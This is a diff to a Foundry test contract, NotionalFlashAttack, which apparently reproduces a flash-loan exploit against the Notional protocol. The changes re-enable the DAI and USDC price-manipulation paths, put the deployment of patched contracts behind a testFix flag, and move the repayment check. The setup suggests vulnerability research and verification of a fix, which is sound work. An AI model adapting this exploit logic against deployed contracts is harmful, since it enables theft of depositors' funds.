@@ -70,6 +70,7 @@ contract NotionalFlashAttack is Test, IFlashLoanReceiver {
     address bob = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
     address charlie = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;
 
+    bool testFix = false; // If this is set to true then the test should fail.
 
     Currency[] currencies;
     uint256[] startingNotionalBalances;
@@ -139,11 +140,11 @@ contract NotionalFlashAttack is Test, IFlashLoanReceiver {
         // logAll("Before deposit and mint", c);
         depositAndMintNTokens(c, bal);
 
-        logAll("Before redeem", c);
+        //logAll("Before redeem", c);
         uint96 userNTokenBalance = getNTokenBalance(c.user);
         (int256 numRedeemed,) = notional.nTokenRedeem(c.user.addr, c.currencyId, userNTokenBalance, true, true);
 
-        logAll("After redeem", c);
+        //logAll("After redeem", c);
 
 
         uint88 userToWithdraw = getCurrencyToWithdraw(c.user);
@@ -151,7 +152,7 @@ contract NotionalFlashAttack is Test, IFlashLoanReceiver {
         notional.withdraw(c.currencyId, userToWithdraw, true); // redeem to underlying
 
 
-        if (c.currencyId == 2 && false/* DAI */) {
+        if (c.currencyId == 2 /* DAI */) {
 
             /* It's hard to believe how hacky the code just within this block is:
              * What it demonstrates is that it is possible to manipulate the price in
@@ -184,7 +185,7 @@ contract NotionalFlashAttack is Test, IFlashLoanReceiver {
             notional.withdraw(c.currencyId, userToWithdraw, true); // redeem to underlying
         }
 
-        if (c.currencyId == 3 && false /* USDC */) {
+        if (c.currencyId == 3 /* USDC */) {
 
             /* It's hard to believe how hacky the code just within this block is:
              * What it demonstrates is that it is possible to manipulate the price in
@@ -255,29 +256,29 @@ contract NotionalFlashAttack is Test, IFlashLoanReceiver {
             startingNotionalBalances.push(inNotionalBefore);
         }
 
-        /* Deploy new AccountAction */
-        vm.startPrank(notional.owner());
-        AccountAction accountAction = new AccountAction();
-        BatchAction batchAction = new BatchAction();
+        if (testFix) {
+            vm.startPrank(notional.owner());
+            AccountAction accountAction = new AccountAction();
+            BatchAction batchAction = new BatchAction();
 
-        Router newRouter = new Router(
-            0x38A4DfC0ff6588fD0c2142d14D4963A97356A245, // governance
-            0xBf91ec7A64FCF0844e54d3198E50AD8fb4D68E93, // views
-            0xe3E38607A1E2d6881A32F1D78C5C232f14bdef22, // initializeMarket
-            0xeA82Cfc621D5FA00E30c10531380846BB5aAfE79, // nTokenActions
-            // 0x1d1a531CBcb969040Da7527bf1092DfC4FF7DD46, // batchAction
-            address(batchAction),
-            address(accountAction),                     // accountAction
-            0xBf12d7e41a25f449293AB8cd1364Fe74A175bFa5, // erc1155
-            0xa3707CD595F6AB810a84d04C92D8adE5f7593Db5, // liquidateCurrency
-            0xfB56271c976A8b446B6D33D1Ec76C84F6AA53F1B, // liquidatefCash
-            0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5, // cETH
-            0x5fd75e91Cc34DF9831Aa75903027FC34FeB9b931, // treasury
-            0xbE4AbA25915BAd390edf83B7e1ca44b6145F261e  // calculationViews
-        );
-        notional.upgradeTo(address(newRouter));
-        vm.stopPrank();
-
+            Router newRouter = new Router(
+                0x38A4DfC0ff6588fD0c2142d14D4963A97356A245, // governance
+                0xBf91ec7A64FCF0844e54d3198E50AD8fb4D68E93, // views
+                0xe3E38607A1E2d6881A32F1D78C5C232f14bdef22, // initializeMarket
+                0xeA82Cfc621D5FA00E30c10531380846BB5aAfE79, // nTokenActions
+                // 0x1d1a531CBcb969040Da7527bf1092DfC4FF7DD46, // batchAction
+                address(batchAction),
+                address(accountAction),                     // accountAction
+                0xBf12d7e41a25f449293AB8cd1364Fe74A175bFa5, // erc1155
+                0xa3707CD595F6AB810a84d04C92D8adE5f7593Db5, // liquidateCurrency
+                0xfB56271c976A8b446B6D33D1Ec76C84F6AA53F1B, // liquidatefCash
+                0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5, // cETH
+                0x5fd75e91Cc34DF9831Aa75903027FC34FeB9b931, // treasury
+                0xbE4AbA25915BAd390edf83B7e1ca44b6145F261e  // calculationViews
+            );
+            notional.upgradeTo(address(newRouter));
+            vm.stopPrank();
+        }
     }
 
     function testFlashLoan() public {
@@ -345,16 +346,19 @@ contract NotionalFlashAttack is Test, IFlashLoanReceiver {
                 );
 
             }
+
+
+
         } else if (testAction == TestAction.BuyResiduals) {
             buyResiduals(currencies[0]);
         }
 
-        if (IERC20(assets[i]).balanceOf(address(this)) < amounts[i] + premiums[i] ) {
-            revert("Not enough cash to repay flash loan");
-        }
 
         // Approve the LendingPool contract allowance to *pull* the owed amount
         for (i = 0; i < assets.length; i++) {
+            if (IERC20(assets[i]).balanceOf(address(this)) < amounts[i] + premiums[i] ) {
+              revert("Not enough cash to repay flash loan");
+            }
             uint amountOwing = amounts[i] + premiums[i];
             IERC20(assets[i]).approve(address(LENDING_POOL), amountOwing);
         }
